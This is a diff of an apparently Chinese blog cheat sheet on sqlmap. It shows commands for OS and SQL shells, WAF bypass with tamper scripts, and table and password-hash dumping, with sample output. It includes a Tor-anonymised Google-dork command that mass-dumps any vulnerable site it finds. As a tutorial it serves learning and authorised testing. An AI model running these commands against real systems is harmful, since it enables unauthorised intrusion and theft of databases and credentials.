+<h1 id="交互式-shell"><a href="#交互式-shell" class="headerlink" title="交互式 shell"></a>交互式 shell</h1><p>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-cmd “ipconfig”<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-shell<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –os-pwn<br>./sqlmap.py -u “<a href="http://www.xxx.com&quot;" target="_blank" rel="noopener">http://www.xxx.com&quot;</a> –sql-shell<br><strong>条件绝对路径+注入点</strong></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./10.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
 <h1 id="伪静态网页注入"><a href="#伪静态网页注入" class="headerlink" title="伪静态网页注入"></a>伪静态网页注入</h1><p>显示为HTML网页，其实有和数据库交互<br>sqlmap -u “<a href="http://www.123.com/index/id/2*.com&quot;" target="_blank" rel="noopener">http://www.123.com/index/id/2*.com&quot;</a></p>
 <h1 id="sqlmap绕过WAF防火墙"><a href="#sqlmap绕过WAF防火墙" class="headerlink" title="sqlmap绕过WAF防火墙"></a>sqlmap绕过WAF防火墙</h1><p>sqlmap tamper下有绕过文件选项<br>–batch Never ask for user input, use the default behaviour<br>–tamper=TAMPER Use given script(s) for tampering injection data<br>常见 encoder: space2hash.py, space2morehash.py, base64encode.py, charencode.py<br>示例<br><code>./sqlmap.py -u &quot;http://www.xxx.com&quot; -v 3 --dbs --batch --tamper &quot;space2hash.py&quot;</code></p>
 <h1 id="Tor代理与跳板"><a href="#Tor代理与跳板" class="headerlink" title="Tor代理与跳板"></a>Tor代理与跳板</h1><p><code>sudo service tor start</code><br>下面的命令将运行 SQLMap 用一些基本的设置使用 Tor 继续攻击者匿名, 也完全自动化的选择可能脆弱的网站, 使其在谷歌上搜索他们。<br>从一个终端攻击者将执行下列 (记住, 这只是向您显示攻击者是多<br>么容易, 您可能不希望运行此):<br><code>./sqlmap.py --tor --tor-type=SOCKS5 -g &quot;inurl:.php?id=1&quot; --random-agent --dump-all --batch
@@ -246,508 +303,318 @@
 <h1 id="使用-Tor-网络当连接到目标网站攻击"><a href="#使用-Tor-网络当连接到目标网站攻击" class="headerlink" title="使用 Tor 网络当连接到目标网站攻击"></a>使用 Tor 网络当连接到目标网站攻击</h1><p><code>--tor-type=SOCKS5</code><br>在 <code>SOCKS5</code> 协议使用 <code>Tor</code>，比默认 <code>Tor</code> 匿名类型 <code>HTTP</code> 代理更好用。<br>使用代理访问外网网址<br><code>--proxy=(http|socks5|https)://127.0.0.1:PORT</code></p>
 <h1 id="任意注射点"><a href="#任意注射点" class="headerlink" title="任意注射点"></a>任意注射点</h1><p>添加*<br><code>$ python sqlmap.py -u &quot;http://targeturl&quot; --cookie=&quot;param1=value1*;param2=value2&quot;</code></p>
 <h1 id="定制注射负载"><a href="#定制注射负载" class="headerlink" title="定制注射负载"></a>定制注射负载</h1><p>选项：<code>--prefix</code>和<code>--suffix</code></p>
-<pre><code class="hljs vim">$ <span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-comment">"http://192.168.136.131/sqlmap/mysql/get_str_brackets.php\</span>
-?id=<span class="hljs-number">1</span><span class="hljs-string">" -p id --prefix "</span><span class="hljs-string">')" --suffix "AND ('</span><span class="hljs-keyword">abc</span><span class="hljs-string">'='</span><span class="hljs-keyword">abc</span><span class="hljs-comment">"</span>
-[...]</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.136.131&#x2F;sqlmap&#x2F;mysql&#x2F;get_str_brackets.php\</span><br><span class="line">?id&#x3D;1&quot; -p id --prefix &quot;&#39;)&quot; --suffix &quot;AND (&#39;abc&#39;&#x3D;&#39;abc&quot;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
 <p>sqlmap形成payload如下：<br><code>$query = &quot;SELECT * FROM users WHERE id=(&#39;1&#39;) &lt;PAYLOAD&gt; AND (&#39;abc&#39;=&#39;abc&#39;) LIMIT 0, 1&quot;;</code></p>
 <h1 id="水平选择"><a href="#水平选择" class="headerlink" title="水平选择"></a>水平选择</h1><p>–level<br>sqlmap使用的有效负载在文本文件中指定xml/payloads.xml<br>始终测试GET和POST参数，从级别2测试HTTP Cookie标头值，并测试HTTP User-Agent / Referer标头的值3级</p>
 <h1 id="页面比较"><a href="#页面比较" class="headerlink" title="页面比较"></a>页面比较</h1><p>选项：–string，–not-string，–regexp和–code<br>//true和false值的选择根据需要来定<br>‘False 401 True 200’ -&gt;true –code=200<br>‘False Forbidden True Welcome’ -&gt; –titles=Welcome</p>
-<h1 id="sql注入技术选择"><a href="#sql注入技术选择" class="headerlink" title="sql注入技术选择"></a>sql注入技术选择</h1><pre><code class="hljs armasm"><span class="hljs-keyword">B：基于布尔的盲</span>
-<span class="hljs-keyword">E：基于错误</span>
-<span class="hljs-keyword">U：基于联合查询</span>
-<span class="hljs-keyword">S：堆叠查询</span>
-<span class="hljs-keyword">T：基于时间的盲人</span>
-<span class="hljs-keyword">Q：内联查询</span></code></pre>
+<h1 id="sql注入技术选择"><a href="#sql注入技术选择" class="headerlink" title="sql注入技术选择"></a>sql注入技术选择</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">B：基于布尔的盲</span><br><span class="line">E：基于错误</span><br><span class="line">U：基于联合查询</span><br><span class="line">S：堆叠查询</span><br><span class="line">T：基于时间的盲人</span><br><span class="line">Q：内联查询</span><br></pre></td></tr></table></figure>
 <p>例如，ES如果您只想测试和利用基于错误的堆栈查询SQL注入类型，则可以提供。默认值为BEUSTQ</p>
 <h1 id="union查询中的sql注入条件修改"><a href="#union查询中的sql注入条件修改" class="headerlink" title="union查询中的sql注入条件修改"></a>union查询中的sql注入条件修改</h1><p>–union-cols 改变注入的列数<br>–union-char 默认使用NULL查询，可以特殊指定查询（–union-char 123）<br>–union-from 指定from后指定的表名如–union-from =users</p>
 <h1 id="注入文件xml学习"><a href="#注入文件xml学习" class="headerlink" title="注入文件xml学习"></a>注入文件xml学习</h1><p>参考链接：<a href="https://www.freebuf.com/column/161797.html" target="_blank" rel="noopener">https://www.freebuf.com/column/161797.html</a></p>
-<pre><code class="hljs dts"><span class="hljs-params">&lt;test&gt;</span>  <span class="hljs-comment">//payload标题</span>
-        <span class="hljs-params">&lt;title&gt;</span>AND boolean-based blind - WHERE or HAVING clause<span class="hljs-params">&lt;/title&gt;</span>
-        <span class="hljs-comment">//paload注入类型</span>
-        <span class="hljs-params">&lt;stype&gt;</span><span class="hljs-number">1</span><span class="hljs-params">&lt;/stype&gt;</span>
-        <span class="hljs-comment">//payload发包级别</span>
-        <span class="hljs-params">&lt;level&gt;</span><span class="hljs-number">1</span><span class="hljs-params">&lt;/level&gt;</span>
-        <span class="hljs-comment">//风险等级指数</span>
-        <span class="hljs-params">&lt;risk&gt;</span><span class="hljs-number">1</span><span class="hljs-params">&lt;/risk&gt;</span>
-        <span class="hljs-params">&lt;clause&gt;</span><span class="hljs-number">1</span>,<span class="hljs-number">9</span><span class="hljs-params">&lt;/clause&gt;</span>
-        <span class="hljs-params">&lt;where&gt;</span><span class="hljs-number">1</span><span class="hljs-params">&lt;/where&gt;</span>
-        <span class="hljs-comment">//sql注入模板</span>
-        <span class="hljs-params">&lt;vector&gt;</span>AND [INFERENCE]<span class="hljs-params">&lt;/vector&gt;</span>
-        <span class="hljs-comment">//sql注入请求测试</span>
-        <span class="hljs-params">&lt;request&gt;</span>
-            <span class="hljs-params">&lt;payload&gt;</span>AND [RANDNUM]=[RANDNUM]<span class="hljs-params">&lt;/payload&gt;</span>
-        <span class="hljs-params">&lt;/request&gt;</span>
-        <span class="hljs-params">&lt;response&gt;</span>
-            <span class="hljs-params">&lt;comparison&gt;</span>AND [RANDNUM]=[RANDNUM1]<span class="hljs-params">&lt;/comparison&gt;</span>
-        <span class="hljs-params">&lt;/response&gt;</span>
-    <span class="hljs-params">&lt;/test&gt;</span></code></pre>
-<h1 id="列出数据库信息-包含列出库表列"><a href="#列出数据库信息-包含列出库表列" class="headerlink" title="列出数据库信息(包含列出库表列)"></a>列出数据库信息(包含列出库表列)</h1><h2 id="–current-user-：会话用户查询"><a href="#–current-user-：会话用户查询" class="headerlink" title="–current-user ：会话用户查询"></a>–current-user ：会话用户查询</h2><h2 id="–current-db-当前数据库"><a href="#–current-db-当前数据库" class="headerlink" title="–current-db : 当前数据库"></a>–current-db : 当前数据库</h2><h2 id="–hostname-服务器主机名"><a href="#–hostname-服务器主机名" class="headerlink" title="–hostname : 服务器主机名"></a>–hostname : 服务器主机名</h2><h2 id="–is-dba-检测会话用户是否是数据库管理员"><a href="#–is-dba-检测会话用户是否是数据库管理员" class="headerlink" title="–is-dba : 检测会话用户是否是数据库管理员"></a>–is-dba : 检测会话用户是否是数据库管理员</h2><h2 id="–users-：-列出数据库管理系统用户"><a href="#–users-：-列出数据库管理系统用户" class="headerlink" title="–users ： 列出数据库管理系统用户"></a>–users ： 列出数据库管理系统用户</h2><h2 id="–passwords-列出并列出数据库管理员用户的密码hash"><a href="#–passwords-列出并列出数据库管理员用户的密码hash" class="headerlink" title="–passwords : 列出并列出数据库管理员用户的密码hash"></a>–passwords : 列出并列出数据库管理员用户的密码hash</h2><pre><code class="hljs routeros">database management<span class="hljs-built_in"> system users </span>password hashes:                                                                      
-[*] debian-sys-maint [1]:
-    password hash: <span class="hljs-number">*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span>
-    clear-text password: root
-[*] root [2]:
-    password hash: <span class="hljs-number">*6036DEF7A88F5784569BDE19F070A5C60CE696E6</span>
-    password hash: <span class="hljs-number">*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span>
-    clear-text password: root</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;test&gt;  &#x2F;&#x2F;payload标题</span><br><span class="line">        &lt;title&gt;AND boolean-based blind - WHERE or HAVING clause&lt;&#x2F;title&gt;</span><br><span class="line">        &#x2F;&#x2F;paload注入类型</span><br><span class="line">        &lt;stype&gt;1&lt;&#x2F;stype&gt;</span><br><span class="line">        &#x2F;&#x2F;payload发包级别</span><br><span class="line">        &lt;level&gt;1&lt;&#x2F;level&gt;</span><br><span class="line">        &#x2F;&#x2F;风险等级指数</span><br><span class="line">        &lt;risk&gt;1&lt;&#x2F;risk&gt;</span><br><span class="line">        &lt;clause&gt;1,9&lt;&#x2F;clause&gt;</span><br><span class="line">        &lt;where&gt;1&lt;&#x2F;where&gt;</span><br><span class="line">        &#x2F;&#x2F;sql注入模板</span><br><span class="line">        &lt;vector&gt;AND [INFERENCE]&lt;&#x2F;vector&gt;</span><br><span class="line">        &#x2F;&#x2F;sql注入请求测试</span><br><span class="line">        &lt;request&gt;</span><br><span class="line">            &lt;payload&gt;AND [RANDNUM]&#x3D;[RANDNUM]&lt;&#x2F;payload&gt;</span><br><span class="line">        &lt;&#x2F;request&gt;</span><br><span class="line">        &lt;response&gt;</span><br><span class="line">            &lt;comparison&gt;AND [RANDNUM]&#x3D;[RANDNUM1]&lt;&#x2F;comparison&gt;</span><br><span class="line">        &lt;&#x2F;response&gt;</span><br><span class="line">    &lt;&#x2F;test&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="列出数据库信息-包含列出库表列"><a href="#列出数据库信息-包含列出库表列" class="headerlink" title="列出数据库信息(包含列出库表列)"></a>列出数据库信息(包含列出库表列)</h1><h2 id="–current-user-：会话用户查询"><a href="#–current-user-：会话用户查询" class="headerlink" title="–current-user ：会话用户查询"></a>–current-user ：会话用户查询</h2><h2 id="–current-db-当前数据库"><a href="#–current-db-当前数据库" class="headerlink" title="–current-db : 当前数据库"></a>–current-db : 当前数据库</h2><h2 id="–hostname-服务器主机名"><a href="#–hostname-服务器主机名" class="headerlink" title="–hostname : 服务器主机名"></a>–hostname : 服务器主机名</h2><h2 id="–is-dba-检测会话用户是否是数据库管理员"><a href="#–is-dba-检测会话用户是否是数据库管理员" class="headerlink" title="–is-dba : 检测会话用户是否是数据库管理员"></a>–is-dba : 检测会话用户是否是数据库管理员</h2><h2 id="–users-：-列出数据库管理系统用户"><a href="#–users-：-列出数据库管理系统用户" class="headerlink" title="–users ： 列出数据库管理系统用户"></a>–users ： 列出数据库管理系统用户</h2><h2 id="–passwords-列出并列出数据库管理员用户的密码hash"><a href="#–passwords-列出并列出数据库管理员用户的密码hash" class="headerlink" title="–passwords : 列出并列出数据库管理员用户的密码hash"></a>–passwords : 列出并列出数据库管理员用户的密码hash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">database management system users password hashes:                                                                      </span><br><span class="line">[*] debian-sys-maint [1]:</span><br><span class="line">    password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">    clear-text password: root</span><br><span class="line">[*] root [2]:</span><br><span class="line">    password hash: *6036DEF7A88F5784569BDE19F070A5C60CE696E6</span><br><span class="line">    password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">    clear-text password: root</span><br></pre></td></tr></table></figure>
 <h2 id="–privileges-：列出数据库管理系统用户权限"><a href="#–privileges-：列出数据库管理系统用户权限" class="headerlink" title="–privileges ：列出数据库管理系统用户权限"></a>–privileges ：列出数据库管理系统用户权限</h2><h2 id="–roles-：列出数据库管理系统用户角色"><a href="#–roles-：列出数据库管理系统用户角色" class="headerlink" title="–roles ：列出数据库管理系统用户角色"></a>–roles ：列出数据库管理系统用户角色</h2><h2 id="列出除系统数据库以外的表"><a href="#列出除系统数据库以外的表" class="headerlink" title="列出除系统数据库以外的表"></a>列出除系统数据库以外的表</h2><p>sqlmap -u <a href="http://127.0.0.1/sqli-labs/Less-38/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-38/?id=1</a> –exclude-sysdbs –tables</p>
 <h1 id="转存数据库表目"><a href="#转存数据库表目" class="headerlink" title="转存数据库表目"></a>转存数据库表目</h1><p>开关和选项：</p>
-<pre><code class="hljs brainfuck">--<span class="hljs-comment">dump，</span><span class="hljs-literal">-</span><span class="hljs-comment">C，</span><span class="hljs-literal">-</span><span class="hljs-comment">T，</span><span class="hljs-literal">-</span><span class="hljs-comment">D，</span>--<span class="hljs-comment">start，</span>--<span class="hljs-comment">stop，</span>--<span class="hljs-comment">first，</span>--<span class="hljs-comment">last，</span>--<span class="hljs-comment">pivot</span><span class="hljs-literal">-</span><span class="hljs-comment">column和</span>--<span class="hljs-comment">where</span></code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--dump，-C，-T，-D，--start，--stop，--first，--last，--pivot-column和--where</span><br></pre></td></tr></table></figure>
 <h1 id="运行自定义SQL语句"><a href="#运行自定义SQL语句" class="headerlink" title="运行自定义SQL语句"></a>运行自定义SQL语句</h1><p>选项和开关：<code>--sql-query和--sql-shell</code></p>
-<pre><code class="hljs groovy">$ python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1"</span> --\
-sql-query <span class="hljs-string">"SELECT 'foo'"</span> -v <span class="hljs-number">1</span>
-
-[...]
-[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">14</span>] [INFO] fetching SQL SELECT query <span class="hljs-string">output:</span> <span class="hljs-string">'SELECT '</span>foo<span class="hljs-string">''</span>
-[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">14</span>] [INFO] <span class="hljs-string">retrieved:</span> foo
-SELECT <span class="hljs-string">'foo'</span>:    <span class="hljs-string">'foo'</span>
-
-$ python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1"</span> --\
-sql-query <span class="hljs-string">"SELECT 'foo', 'bar'"</span> -v <span class="hljs-number">2</span>
-
-[...]
-[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [INFO] fetching SQL SELECT query <span class="hljs-string">output:</span> <span class="hljs-string">'SELECT '</span>foo<span class="hljs-string">', '</span>bar<span class="hljs-string">''</span>
-[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [INFO] the SQL query provided has more than a field. sqlmap will now 
-unpack it into distinct queries to be able to retrieve the output even <span class="hljs-keyword">if</span> we are
- going blind
-[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [DEBUG] <span class="hljs-string">query:</span> SELECT ISNULL(CAST((CHAR(<span class="hljs-number">102</span>)+CHAR(<span class="hljs-number">111</span>)+CHAR(<span class="hljs-number">111</span>)) AS 
-VARCHAR(<span class="hljs-number">8000</span>)), (CHAR(<span class="hljs-number">32</span>)))
-[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [INFO] <span class="hljs-string">retrieved:</span> foo
-[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [DEBUG] performed <span class="hljs-number">27</span> queries <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> seconds
-[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [DEBUG] <span class="hljs-string">query:</span> SELECT ISNULL(CAST((CHAR(<span class="hljs-number">98</span>)+CHAR(<span class="hljs-number">97</span>)+CHAR(<span class="hljs-number">114</span>)) AS VA
-RCHAR(<span class="hljs-number">8000</span>)), (CHAR(<span class="hljs-number">32</span>)))
-[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [INFO] <span class="hljs-string">retrieved:</span> bar
-[<span class="hljs-string">hh:</span><span class="hljs-string">mm:</span><span class="hljs-number">50</span>] [DEBUG] performed <span class="hljs-number">27</span> queries <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> seconds
-SELECT <span class="hljs-string">'foo'</span>, <span class="hljs-string">'bar'</span>:    <span class="hljs-string">'foo, bar'</span></code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.136.131&#x2F;sqlmap&#x2F;mssql&#x2F;get_int.php?id&#x3D;1&quot; --\</span><br><span class="line">sql-query &quot;SELECT &#39;foo&#39;&quot; -v 1</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:14] [INFO] fetching SQL SELECT query output: &#39;SELECT &#39;foo&#39;&#39;</span><br><span class="line">[hh:mm:14] [INFO] retrieved: foo</span><br><span class="line">SELECT &#39;foo&#39;:    &#39;foo&#39;</span><br><span class="line"></span><br><span class="line">$ python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.136.131&#x2F;sqlmap&#x2F;mssql&#x2F;get_int.php?id&#x3D;1&quot; --\</span><br><span class="line">sql-query &quot;SELECT &#39;foo&#39;, &#39;bar&#39;&quot; -v 2</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[hh:mm:50] [INFO] fetching SQL SELECT query output: &#39;SELECT &#39;foo&#39;, &#39;bar&#39;&#39;</span><br><span class="line">[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now </span><br><span class="line">unpack it into distinct queries to be able to retrieve the output even if we are</span><br><span class="line"> going blind</span><br><span class="line">[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS </span><br><span class="line">VARCHAR(8000)), (CHAR(32)))</span><br><span class="line">[hh:mm:50] [INFO] retrieved: foo</span><br><span class="line">[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds</span><br><span class="line">[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VA</span><br><span class="line">RCHAR(8000)), (CHAR(32)))</span><br><span class="line">[hh:mm:50] [INFO] retrieved: bar</span><br><span class="line">[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds</span><br><span class="line">SELECT &#39;foo&#39;, &#39;bar&#39;:    &#39;foo, bar&#39;</span><br></pre></td></tr></table></figure>
 <p>这里可以理解为解决特殊查询</p>
 <h1 id="新用户运行可执行命令"><a href="#新用户运行可执行命令" class="headerlink" title="新用户运行可执行命令"></a>新用户运行可执行命令</h1><p>sqlmap –wizard</p>
-<h1 id="搜索数据库常用参数整理"><a href="#搜索数据库常用参数整理" class="headerlink" title="搜索数据库常用参数整理"></a>搜索数据库常用参数整理</h1><pre><code class="hljs pgsql">-a, <span class="hljs-comment">--all           Retrieve everything</span>
-        检索所有，这是拖库的节奏啊
-    -b, <span class="hljs-comment">--banner        Retrieve DBMS banner</span>
-        检索数据库的一些标志性的信息，就是指纹这样子吧
-    <span class="hljs-comment">--current-user      Retrieve DBMS current user</span>
-        检索当前连接数据库的用户
-    <span class="hljs-comment">--current-db        Retrieve DBMS current database</span>
-        检索当前连接的数据库
-    <span class="hljs-comment">--hostname          Retrieve DBMS server hostname</span>
-        检索服务器的主机名
-    <span class="hljs-comment">--is-dba            Detect if the DBMS current user is DBA</span>
-        检测是不是dba，就是root权限咯
-    <span class="hljs-comment">--users             Enumerate DBMS users</span>
-        枚举数据库用户
-    <span class="hljs-comment">--passwords         Enumerate DBMS users password hashes</span>
-        枚举数据库用户的哈希值
-    <span class="hljs-comment">--privileges        Enumerate DBMS users privileges</span>
-        枚举数据库用户的权限
-    <span class="hljs-comment">--roles             Enumerate DBMS users roles</span>
-        枚举数据库用户的角色
-    <span class="hljs-comment">--dbs               Enumerate DBMS databases</span>
-        枚举数据库有哪些
-    <span class="hljs-comment">--tables            Enumerate DBMS database tables</span>
-        枚举数据表名
-    <span class="hljs-comment">--columns           Enumerate DBMS database table columns</span>
-        枚举列名
-    <span class="hljs-comment">--schema            Enumerate DBMS schema</span>
-        这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举
-    <span class="hljs-comment">--count             Retrieve number of entries for table(s)</span>
-        枚举表格个数
-    <span class="hljs-comment">--dump              Dump DBMS database table entries</span>
-        输出数据库表的数据
-    <span class="hljs-comment">--dump-all          Dump all DBMS databases tables entries</span>
-        输出所有
-    <span class="hljs-comment">--search            Search column(s), table(s) and/or database name(s)</span>
-        查找特定的列名，表名或数据库名，配合下面的-D,-C,-T
-    <span class="hljs-comment">--comments          Retrieve DBMS comments</span>
-        枚举数据库的注释
-    -D DB               DBMS <span class="hljs-keyword">database</span> <span class="hljs-keyword">to</span> enumerate
-        指定数据库名
-    -T TBL              DBMS <span class="hljs-keyword">database</span> <span class="hljs-keyword">table</span>(s) <span class="hljs-keyword">to</span> enumerate
-        指定表名
-    -C COL              DBMS <span class="hljs-keyword">database</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">column</span>(s) <span class="hljs-keyword">to</span> enumerate
-        指定列名
-    -X EXCLUDECOL       DBMS <span class="hljs-keyword">database</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">column</span>(s) <span class="hljs-keyword">to</span> <span class="hljs-keyword">not</span> enumerate
-        指定不枚举那个列
-    -U <span class="hljs-keyword">USER</span>             DBMS <span class="hljs-keyword">user</span> <span class="hljs-keyword">to</span> enumerate
-        枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数
-    <span class="hljs-comment">--exclude-sysdbs    Exclude DBMS system databases when enumerating tables</span>
-        枚举时排除系统的数据库
-    <span class="hljs-comment">--pivot-column=P..  Pivot column name</span>
-        以某一列为核心？这个用过没感觉出什么用
-    <span class="hljs-comment">--where=DUMPWHERE   Use WHERE condition while table dumping</span>
-        使用<span class="hljs-keyword">where</span>调试限制<span class="hljs-keyword">table</span>的输出
-    <span class="hljs-comment">--start=LIMITSTART  First query output entry to retrieve</span>
-        指定开始从第几行开始输出，如<span class="hljs-comment">--start=3，前两行就不输出了</span>
-    <span class="hljs-comment">--stop=LIMITSTOP    Last query output entry to retrieve</span>
-        指定从第几行开始停止输出
-    <span class="hljs-comment">--first=FIRSTCHAR   First query output word character to retrieve</span>
-        指定只输出第几个字符开始输出，盲注才有效，亲测
-    <span class="hljs-comment">--last=LASTCHAR     Last query output word character to retrieve</span>
-        指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，
-        如 ：<span class="hljs-comment">--first 3 --last 5  只输出3到5位置的字符</span>
-    <span class="hljs-comment">--sql-query=QUERY   SQL statement to be executed</span>
-        指定执行我们的<span class="hljs-keyword">sql</span>语句
-    <span class="hljs-comment">--sql-shell         Prompt for an interactive SQL shell</span>
-        返回一个<span class="hljs-keyword">sql</span>的shell
-    <span class="hljs-comment">--sql-file=SQLFILE  Execute SQL statements from given file(s)</span>
-        从文件中读取执行<span class="hljs-keyword">sql</span>语句
- 
--D DB               要进行枚举的指定数据库名
-   -T TBL              DBMS数据库表枚举
-   -C COL             DBMS数据库表列枚举
-   -X EXCLUDECOL     DBMS数据库表不进行枚举
-./sqlmap.py sqlmap -u "http://www.xxx.com" //查是否有注入，一些基本信息  
-./sqlmap.py -u "http://www.xxx.com" <span class="hljs-comment">--dbs //枚举数据库</span>
-./sqlmap.py sqlmap -u "http://www.xxx.com" <span class="hljs-comment">--tables //表名枚举</span>
-./sqlmap.py sqlmap -u "http://www.xxx.com" <span class="hljs-comment">--columns -T 数据库表名 //字段枚举</span>
-./sqlmap.py sqlmap -u "http://www.xxx.com" <span class="hljs-comment">--dump -T 数据库表名 -C "字段1，字段2，字段3" //dump</span>
-./sqlmap.py -u "http://www.xxx.com" <span class="hljs-comment">--dump -D 数据库名 -T 表名 -C "字段名1，字段名2，字段名3" //dump</span></code></pre>
+<h1 id="搜索数据库常用参数整理"><a href="#搜索数据库常用参数整理" class="headerlink" title="搜索数据库常用参数整理"></a>搜索数据库常用参数整理</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">-a, --all           Retrieve everything</span><br><span class="line">        检索所有，这是拖库的节奏啊</span><br><span class="line">    -b, --banner        Retrieve DBMS banner</span><br><span class="line">        检索数据库的一些标志性的信息，就是指纹这样子吧</span><br><span class="line">    --current-user      Retrieve DBMS current user</span><br><span class="line">        检索当前连接数据库的用户</span><br><span class="line">    